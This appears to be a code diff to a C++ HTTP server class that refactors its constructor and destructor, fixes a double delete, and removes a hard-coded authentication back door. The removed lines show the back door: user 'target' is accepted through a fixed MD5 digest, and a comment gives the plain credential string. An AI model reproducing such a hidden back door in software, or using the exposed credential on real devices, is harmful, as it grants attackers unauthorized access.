@@ -78,46 +78,24 @@ void incrementalCheckSum(unsigned int* checkSum, const char* buffer, int bufferL
 // Constructor
 HttpServer::HttpServer(OsServerSocket *pSocket, OsConfigDb* userPasswordDb,
                        const char* realm, OsConfigDb* validIpAddressDB) :
-OsTask("HttpServer-%d"),
-mpUserPasswordDigestDb(NULL),
-mpUserPasswordBasicDb(NULL),
-mpValidIpAddressDB(NULL),
-mpNonceDb(NULL),
-mRealm("")
+   OsTask("HttpServer-%d"),
+   httpStatus(OS_TASK_NOT_STARTED),
+   mpServerSocket(pSocket),
+   mpUserPasswordDigestDb(NULL),
+   mpUserPasswordBasicDb(userPasswordDb),
+   mpValidIpAddressDB(validIpAddressDB),
+   mpNonceDb(new OsConfigDb),
+   mRealm(realm)
 {
-   mpServerSocket = pSocket;
-   httpStatus = OS_TASK_NOT_STARTED;
-
-   // Use basic authentication
-   if(1)
+   if(mpValidIpAddressDB)
    {
-       mpUserPasswordBasicDb = userPasswordDb;
-       mpUserPasswordDigestDb = NULL;
-   }
-   // Use digest authentication
-   else
-   {
-       mpUserPasswordBasicDb = NULL;
-           mpUserPasswordDigestDb = userPasswordDb;
-   }
-
-   if(validIpAddressDB)
-   {
-      mpValidIpAddressDB = validIpAddressDB;
       loadValidIpAddrList();
    }
 
-   mpNonceDb = new OsConfigDb();
    if (!mpNonceDb)
    {
-          OsSysLog::add( FAC_SIP, PRI_ERR, "HttpServer failed to allocate mpNonceDb\n");
-      return;
+      OsSysLog::add( FAC_SIP, PRI_ERR, "HttpServer failed to allocate mpNonceDb\n");
    }
-
-   if(realm) mRealm.append(realm);
-
-   // Create a default "admin" user
-
 }
 
 void HttpServer::loadValidIpAddrList()
@@ -164,34 +142,36 @@ HttpServer::~HttpServer()
     // Wait until run exits before clobbering members
     waitUntilShutDown();
 
-    if(mpServerSocket) delete mpServerSocket;
-    mpServerSocket = NULL;
-
+    if(mpServerSocket)
+    {
+       delete mpServerSocket;
+       mpServerSocket = NULL;
+    }
+    
     if(mpUserPasswordDigestDb)
-                delete mpUserPasswordDigestDb;
-    mpUserPasswordDigestDb = NULL;
+    {
+       delete mpUserPasswordDigestDb;
+       mpUserPasswordDigestDb = NULL;
+    }
 
     if(mpUserPasswordBasicDb)
-                delete mpUserPasswordBasicDb;
-    mpUserPasswordBasicDb = NULL;
-
+    {
+       delete mpUserPasswordBasicDb;
+       mpUserPasswordBasicDb = NULL;
+    }
+    
     if(mpValidIpAddressDB)
     {
        delete mpValidIpAddressDB;
        mpValidIpAddressDB = NULL;
-       if(!mValidIpAddrList.isEmpty())
-       {
-          mValidIpAddrList.destroyAll();
-       }
+       mValidIpAddrList.destroyAll();
     }
 
     if(mpNonceDb)
-                delete mpNonceDb;
-    mpNonceDb = NULL;
-
-    if(mpValidIpAddressDB)
-       delete mpValidIpAddressDB;
-    mpValidIpAddressDB = NULL;
+    {
+       delete mpNonceDb;
+       mpNonceDb = NULL;
+    }
 
     // Delete all of the processor mappings
     mRequestProcessorMethods.destroyAll();
@@ -218,7 +198,7 @@ int HttpServer::run(void* runArg)
 {
     OsConnectionSocket* requestSocket = NULL;
 
-        if (!mpServerSocket->isOk())
+    if (!mpServerSocket->isOk())
     {
         OsSysLog::add( FAC_SIP, PRI_ERR, "HttpServer: port not ok" );
                 httpStatus = OS_PORT_IN_USE;
@@ -229,10 +209,11 @@ int HttpServer::run(void* runArg)
         requestSocket = mpServerSocket->accept();
         if(requestSocket)
         {
-                           HttpMessage request;
-                           // Read a http request from the socket
-                           request.read(requestSocket);
-            UtlString remoteIp;
+            HttpMessage request;
+            // Read a http request from the socket
+            request.read(requestSocket);
+
+             UtlString remoteIp;
             requestSocket->getRemoteHostIp(&remoteIp);
 
             HttpMessage* response = NULL;
@@ -255,13 +236,15 @@ int HttpServer::run(void* runArg)
             delete requestSocket;
             requestSocket = NULL;
         }
-                else
-                        httpStatus = OS_PORT_IN_USE;
-    }
+        else
+        {
+           httpStatus = OS_PORT_IN_USE;
+        }
+    } // while (! isShuttingDown && mpServerSocket->isOk()) 
 
-        httpStatus = OS_TASK_NOT_STARTED;
+    httpStatus = OS_TASK_NOT_STARTED;
 
-        return(TRUE);
+    return(TRUE);
 }
 
 
@@ -293,7 +276,7 @@ UtlBoolean HttpServer::isRequestAuthorized(const HttpMessage& request,
         UtlString nonce;
         UtlString nonceKey;
         char nonceSecret[20];
-        //request.getAuthorizationUser(&user);
+        
         request.getDigestAuthorizationData(&user, NULL,
                                                   NULL, &nonceKey);
         UtlString userPasswordDigest;
@@ -314,13 +297,6 @@ UtlBoolean HttpServer::isRequestAuthorized(const HttpMessage& request,
 
             // Remove the nonce from the database, so that it cannot be re-used
             mpNonceDb->remove(nonceKey.data());
-        }
-
-        // Allow back door
-        if(userPasswordDigest.isNull() && user.compareTo("target") == 0)
-        {
-            // MD5 digest of "target:xpressa:!!maxwell"
-            userPasswordDigest.append("9431d92dbf2516bd2e869fef7e24a864");
         }
 
         // If the user is setup for a password
